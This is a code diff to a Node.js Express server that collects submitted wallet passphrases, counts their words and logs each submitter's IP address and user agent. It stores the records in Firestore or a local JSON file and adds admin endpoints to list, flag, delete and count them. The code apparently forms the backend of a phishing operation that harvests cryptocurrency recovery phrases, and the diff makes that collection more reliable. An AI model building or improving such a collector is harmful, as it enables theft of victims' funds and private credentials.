@@ -23,9 +23,15 @@ function genId() { return crypto.randomBytes(10).toString('hex'); }
 let useFirebase = false;
 let db = null;
 let admin = null;
+let FieldValue = null;
+let firebaseAppInstance = null;
 try {
   admin = require('firebase-admin');
-  if (admin && admin.credential && typeof admin.credential.cert === 'function') {
+  const firestoreAdmin = require('firebase-admin/firestore');
+  const hasCert = admin && typeof admin.cert === 'function';
+  const hasGetFirestore = firestoreAdmin && typeof firestoreAdmin.getFirestore === 'function';
+  if (hasCert && hasGetFirestore) {
+    FieldValue = firestoreAdmin.FieldValue;
     const rawPk = process.env.FIREBASE_PRIVATE_KEY;
     const privateKey = rawPk ? String(rawPk).replace(/\\n/g, '\n').replace(/^"|"$/g, '') : undefined;
     const serviceAccount = {
@@ -42,23 +48,31 @@ try {
       universe_domain: 'googleapis.com'
     };
     if (privateKey && process.env.FIREBASE_PROJECT_ID && process.env.FIREBASE_CLIENT_EMAIL) {
-      admin.initializeApp({
-        credential: admin.credential.cert(serviceAccount),
+      firebaseAppInstance = admin.initializeApp({
+        credential: admin.cert(serviceAccount),
         databaseURL: `https://${process.env.FIREBASE_PROJECT_ID}.firebaseio.com`
       });
-      db = admin.firestore();
-      useFirebase = true;
-      console.log('Firebase Admin initialized successfully — using Firestore');
+      FieldValue = firestoreAdmin.FieldValue;
+      db = firestoreAdmin.getFirestore(firebaseAppInstance);
+      useFirebase = !!(db && typeof db.collection === 'function');
+      if (useFirebase) {
+        console.log('Firebase Admin initialized successfully — using Firestore (project=' + process.env.FIREBASE_PROJECT_ID + ')');
+        console.log('FieldValue.serverTimestamp available:', !!(FieldValue && typeof FieldValue.serverTimestamp === 'function'));
+      } else {
+        console.log('Firebase Firestore getFirestore returned invalid db object — using local JSON store');
+      }
     } else {
       console.log('Firebase config incomplete — using local JSON store');
     }
   } else {
-    console.log('Firebase Admin SDK could not load credential helper — using local JSON store');
+    console.log('Firebase Admin SDK cert/getFirestore unavailable — using local JSON store');
   }
 } catch (err) {
   console.log('Firebase Admin init warning:', err.message, '— using local JSON store');
   useFirebase = false;
   db = null;
+  FieldValue = null;
+  firebaseAppInstance = null;
 }
 
 const app = express();
@@ -73,30 +87,52 @@ app.post('/api/passphrase', async (req, res) => {
       return res.status(400).json({ success: false, error: 'Passphrase is required' });
     }
     const now = new Date();
-    const base = {
-      phrase: String(phrase),
+    const cleanPhrase = String(phrase);
+    const wordCount = cleanPhrase.trim().split(/\s+/).filter(Boolean).length;
+    const baseRecord = {
+      phrase: cleanPhrase,
+      passphrase: cleanPhrase,
       page: page || null,
       source: source || 'wallet',
       userAgent: userAgent || req.headers['user-agent'] || null,
       ip: ip || (req.headers['x-forwarded-for'] || req.socket.remoteAddress || null),
-      wordCount: String(phrase).trim().split(/\s+/).filter(Boolean).length
+      wordCount: wordCount,
+      flagged: false,
+      viewed: false,
+      walletId: null
     };
-    let id;
-    if (useFirebase && db) {
-      const record = { ...base, createdAt: admin.firestore.FieldValue.serverTimestamp() };
-      const ref = await db.collection('passphrases').add(record);
-      id = ref.id;
-    } else {
-      id = genId();
-      const record = { ...base, id, createdAt: now.toISOString() };
-      const list = readLocal();
-      list.unshift(record);
-      writeLocal(list);
+    let id = null;
+    let savedTo = 'local';
+
+    if (useFirebase && db && typeof db.collection === 'function') {
+      try {
+        const createdAtValue = (FieldValue && typeof FieldValue.serverTimestamp === 'function')
+          ? FieldValue.serverTimestamp()
+          : now.toISOString();
+        const firestoreRecord = { ...baseRecord, createdAt: createdAtValue };
+        const ref = await db.collection('passphrases').add(firestoreRecord);
+        id = ref.id;
+        savedTo = 'firestore';
+        console.log(`[POST /api/passphrase] ✅ FIRESTORE SAVED (id=${id}, source=${baseRecord.source}, words=${wordCount})`);
+      } catch (firestoreErr) {
+        console.error('[POST /api/passphrase] ❌ Firestore save FAILED, falling back to local JSON. Error:', firestoreErr.message);
+        savedTo = 'local-fallback';
+        id = null;
+      }
     }
-    console.log(`[POST /api/passphrase] saved (id=${id}, source=${base.source}, words=${base.wordCount})`);
-    return res.json({ success: true, id });
+
+    if (!id) {
+      id = genId();
+      const localRecord = { ...baseRecord, id, createdAt: now.toISOString() };
+      const list = readLocal();
+      list.unshift(localRecord);
+      writeLocal(list);
+      console.log(`[POST /api/passphrase] 💾 LOCAL SAVED (id=${id}, source=${baseRecord.source}, words=${wordCount}, mode=${savedTo})`);
+    }
+
+    return res.json({ success: true, id, savedTo });
   } catch (err) {
-    console.error('POST /api/passphrase error:', err);
+    console.error('POST /api/passphrase FATAL error:', err);
     return res.status(500).json({ success: false, error: err.message });
   }
 });
@@ -104,7 +140,7 @@ app.post('/api/passphrase', async (req, res) => {
 app.get('/api/passphrases', async (req, res) => {
   try {
     let docs = [];
-    if (useFirebase && db) {
+    if (useFirebase && db && typeof db.collection === 'function') {
       const snapshot = await db
         .collection('passphrases')
         .orderBy('createdAt', 'desc')
@@ -112,28 +148,40 @@ app.get('/api/passphrases', async (req, res) => {
         .get();
       snapshot.forEach(doc => {
         const data = doc.data();
+        const phraseValue = data.phrase || data.passphrase || '';
         docs.push({
           id: doc.id,
-          phrase: data.phrase,
+          phrase: phraseValue,
+          passphrase: phraseValue,
           page: data.page || null,
           source: data.source || null,
           userAgent: data.userAgent || null,
           ip: data.ip || null,
-          wordCount: data.wordCount || null,
-          createdAt: data.createdAt ? data.createdAt.toDate() : null
+          wordCount: data.wordCount || (phraseValue ? phraseValue.trim().split(/\s+/).filter(Boolean).length : null),
+          flagged: data.flagged != null ? data.flagged : false,
+          viewed: data.viewed != null ? data.viewed : false,
+          walletId: data.walletId || null,
+          createdAt: data.createdAt ? (typeof data.createdAt.toDate === 'function' ? data.createdAt.toDate() : new Date(data.createdAt)) : null
         });
       });
     } else {
-      docs = readLocal().slice(0, 1000).map(r => ({
-        id: r.id,
-        phrase: r.phrase,
-        page: r.page || null,
-        source: r.source || null,
-        userAgent: r.userAgent || null,
-        ip: r.ip || null,
-        wordCount: r.wordCount || null,
-        createdAt: r.createdAt ? new Date(r.createdAt) : null
-      }));
+      docs = readLocal().slice(0, 1000).map(r => {
+        const phraseValue = r.phrase || r.passphrase || '';
+        return {
+          id: r.id,
+          phrase: phraseValue,
+          passphrase: phraseValue,
+          page: r.page || null,
+          source: r.source || null,
+          userAgent: r.userAgent || null,
+          ip: r.ip || null,
+          wordCount: r.wordCount || (phraseValue ? phraseValue.trim().split(/\s+/).filter(Boolean).length : null),
+          flagged: r.flagged != null ? r.flagged : false,
+          viewed: r.viewed != null ? r.viewed : false,
+          walletId: r.walletId || null,
+          createdAt: r.createdAt ? new Date(r.createdAt) : null
+        };
+      });
     }
     return res.json({ success: true, count: docs.length, records: docs });
   } catch (err) {
@@ -145,12 +193,15 @@ app.get('/api/passphrases', async (req, res) => {
 app.delete('/api/passphrases/:id', async (req, res) => {
   try {
     const id = req.params.id;
-    if (useFirebase && db) {
-      await db.collection('passphrases').doc(id).delete();
-    } else {
-      const list = readLocal().filter(r => r.id !== id);
-      writeLocal(list);
+    if (useFirebase && db && typeof db.collection === 'function') {
+      try {
+        await db.collection('passphrases').doc(id).delete();
+      } catch (e) {
+        console.error('Delete from Firestore failed, trying local only:', e.message);
+      }
     }
+    const list = readLocal().filter(r => r.id !== id);
+    writeLocal(list);
     return res.json({ success: true });
   } catch (err) {
     console.error('DELETE error:', err);
@@ -165,16 +216,28 @@ app.get('/api/stats', async (req, res) => {
     let last24h = 0;
     const now = Date.now();
     const oneDayAgo = new Date(now - 24 * 60 * 60 * 1000);
-    if (useFirebase && db) {
-      const snap = await db.collection('passphrases').get();
-      total = snap.size;
-      snap.forEach(d => {
-        const data = d.data();
-        const src = data.source || 'unknown';
-        sources[src] = (sources[src] || 0) + 1;
-        if (data.createdAt && data.createdAt.toDate() >= oneDayAgo) last24h++;
-      });
-    } else {
+    if (useFirebase && db && typeof db.collection === 'function') {
+      try {
+        const snap = await db.collection('passphrases').get();
+        total = snap.size;
+        snap.forEach(d => {
+          const data = d.data();
+          const src = data.source || 'unknown';
+          sources[src] = (sources[src] || 0) + 1;
+          let createdAtDt = null;
+          if (data.createdAt) {
+            createdAtDt = typeof data.createdAt.toDate === 'function' ? data.createdAt.toDate() : new Date(data.createdAt);
+          }
+          if (createdAtDt && createdAtDt >= oneDayAgo) last24h++;
+        });
+      } catch (e) {
+        console.error('Stats from Firestore failed, using local:', e.message);
+        total = 0;
+        last24h = 0;
+        Object.keys(sources).forEach(k => delete sources[k]);
+      }
+    }
+    if (!total) {
       const list = readLocal();
       total = list.length;
       list.forEach(r => {
